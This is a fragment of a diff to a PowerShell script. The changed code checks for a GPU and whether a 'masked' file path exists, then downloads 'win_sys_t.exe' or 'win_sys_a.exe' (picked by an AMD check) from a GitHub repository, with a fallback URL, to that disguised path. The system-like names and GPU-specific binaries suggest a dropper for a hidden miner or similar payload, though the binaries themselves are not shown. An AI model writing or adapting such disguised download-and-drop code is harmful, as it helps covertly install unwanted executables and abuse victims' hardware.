@@ -173,10 +173,11 @@ try {
 } catch { }
 
 if ($HasGpu -and -not (Test-Path $MaskedGpu)) {
-    $RawGpuUrl = "https://github.com/$GithubUser/$RepoName/raw/main/win_sys_g.exe"
+    $GpuFile = if ($IsAmd -eq "false") { "win_sys_t.exe" } else { "win_sys_a.exe" }
+    $RawGpuUrl = "https://github.com/$GithubUser/$RepoName/raw/main/$GpuFile"
     $result = Safe-Download -Url $RawGpuUrl -OutPath $MaskedGpu
     if (-not $result) {
-        $FallbackUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/win_sys_g.exe"
+        $FallbackUrl = "https://raw.githubusercontent.com/$GithubUser/$RepoName/main/$GpuFile"
         Safe-Download -Url $FallbackUrl -OutPath $MaskedGpu | Out-Null
     }
 }
